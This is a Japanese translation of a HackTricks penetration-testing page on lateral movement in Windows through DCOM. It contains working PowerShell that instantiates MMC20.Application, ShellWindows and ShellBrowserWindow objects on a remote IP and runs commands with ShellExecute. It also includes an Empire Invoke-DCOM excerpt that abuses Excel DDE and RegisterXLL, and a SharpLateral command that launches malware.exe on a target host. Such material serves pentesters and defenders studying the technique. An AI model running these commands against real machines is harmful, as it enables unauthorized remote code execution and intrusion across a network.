# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksに会社の広告を掲載**したいですか？または、**最新のPEASSバージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正できるようにします。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体の問題を見つけます。今日[**無料で試してみてください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM**（Distributed Component Object Model）オブジェクトは、オブジェクトと**ネットワーク上で** **相互作用**する能力があるため、**興味深い**です。MicrosoftにはDCOMに関する良いドキュメントが[こちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)に、COMに関するドキュメントが[こちら](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)にあります。PowerShellを使用して`Get-CimInstance Win32_DCOMApplication`を実行することで、DCOMアプリケーションの堅牢なリストを見つけることができます。

[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COMオブジェクトを使用すると、MMCスナップイン操作のコンポーネントをスクリプト化できます。このCOMオブジェクト内の異なるメソッドとプロパティを列挙しているとき、`ExecuteShellCommand`というメソッドがDocument.ActiveViewの下にあることに気づきました。

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

そのメソッドについては[こちら](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)で詳しく読むことができます。これまでのところ、ネットワーク上でアクセスでき、コマンドを実行できるDCOMアプリケーションがあります。最後のピースは、このDCOMアプリケーションとExecuteShellCommandメソッドを活用して、リモートホストでコード実行を行うことです。

幸いにも、管理者として、"`[activator]::CreateInstance([type]::GetTypeFromProgID`"を使用してPowerShellでリモートでDCOMと対話することができます。必要なのは、DCOM ProgIDとIPアドレスを提供することです。それから、そのCOMオブジェクトのインスタンスをリモートで返します：

![](<../../.gitbook/assets/image (665).png>)

その後、`ExecuteShellCommand`メソッドを呼び出してリモートホストでプロセスを開始することが可能です：

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

**MMC20.Application**オブジェクトには明示的な「[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)」がなく、デフォルトの許可セットが管理者へのアクセスを許可していました：

![](<../../.gitbook/assets/image (4) (1) (2).png>)

そのスレッドについては[こちら](https://twitter.com/tiraniddo/status/817532039771525120)で詳しく読むことができます。\
明示的なLaunchPermissionが設定されていない他のオブジェクトを表示するには、[@tiraniddo](https://twitter.com/tiraniddo)の[OleView .NET](https://github.com/tyranid/oleviewdotnet)を使用することができます。これには優れたPythonフィルター（その他多くのもの）があります。この場合、明示的なLaunch Permissionが設定されていないすべてのオブジェクトに絞り込むことができます。そうすると、`ShellBrowserWindow`と`ShellWindows`の2つのオブジェクトが私にとって際立っていました：

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

潜在的なターゲットオブジェクトを特定する別の方法は、`HKCR:\AppID\{guid}`のキーから`LaunchPermission`の値が欠落していることを探すことです。Launch Permissionsが設定されたオブジェクトは以下のようになり、データはバイナリ形式でオブジェクトのACLを表しています：

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

明示的なLaunchPermissionが設定されていないものは、その特定のレジストリエントリが欠落しています。

### ShellWindows

最初に探索したオブジェクトは[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)でした。このオブジェクトには[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)が関連付けられていないため、[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NETメソッドと[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)メソッドを組み合わせて、リモートホスト上でそのAppIDを介してオブジェクトをインスタンス化することができます。これを行うには、OleView .NETを使用してShellWindowsオブジェクトの[CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx)を取得する必要があります：

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

以下に示すように、「Launch Permission」フィールドは空白であり、明示的な許可が設定されていません。

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

CLSIDを取得したので、リモートターゲット上でオブジェクトをインスタンス化することができます：
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
リモートホスト上でオブジェクトがインスタンス化されると、それに対してインターフェースを行い、任意のメソッドを呼び出すことができます。オブジェクトへの返されたハンドルは、いくつかのメソッドとプロパティを明らかにしますが、これらとは対話できません。リモートホストと実際に対話を実現するためには、[WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx)メソッドにアクセスする必要があります。これにより、Windowsシェルウィンドウを表すオブジェクトが返されます。
```
$item = $obj.Item()
```
```markdown
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

Shell Windowの完全なハンドルを取得した後、公開されている予想されるメソッド/プロパティにアクセスできるようになります。これらのメソッドを調べた結果、**`Document.Application.ShellExecute`** が目立ちました。このメソッドのパラメータ要件に従ってください。要件は[こちら](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx)で文書化されています。
```
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
上記のように、私たちのコマンドはリモートホストで成功裏に実行されました。

### ShellBrowserWindow

この特定のオブジェクトはWindows 7には存在しないため、私がWin7-Win10で成功裏にテストした「ShellWindows」オブジェクトよりも横方向の移動にはやや限定されています。

このオブジェクトの列挙に基づいて、前のオブジェクトと同様に、エクスプローラーウィンドウへのインターフェースを効果的に提供するようです。このオブジェクトをインスタンス化するには、そのCLSIDを取得する必要があります。上記と同様に、OleView .NETを使用できます：

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

再び、空白のLaunch Permissionフィールドに注意してください：

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

CLSIDを取得したら、前のオブジェクトで行った手順を繰り返してオブジェクトをインスタンス化し、同じメソッドを呼び出すことができます：
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
```markdown
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow_command_execution.png?w=690&h=441)

リモートターゲットでコマンドが正常に実行されたことがわかります。

このオブジェクトはWindowsシェルと直接インターフェースするため、前のオブジェクトで必要だった「ShellWindows.Item」メソッドを呼び出す必要はありません。

これら2つのDCOMオブジェクトはリモートホストでシェルコマンドを実行するために使用できますが、リモートターゲットを列挙したり操作したりするために使用できる他の興味深いメソッドがたくさんあります。これらのメソッドには以下のものが含まれます：

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

同様に、DCOM Excelオブジェクトを悪用して横方向に移動することが可能です。詳細については[https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)を読んでください。
```
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## 自動ツール

* Powershellスクリプト[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)を使用すると、他のマシンでコードを実行するためのコメントされた方法を簡単に呼び出すことができます。
* [**SharpLateral**](https://github.com/mertdas/SharpLateral)も使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考文献

* 最初の方法は [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) からコピーされました。詳細はリンクをフォローしてください。
* 第二のセクションは [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) からコピーされました。詳細はリンクをフォローしてください。

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正してください。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまでの技術スタック全体で問題を見つけます。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>
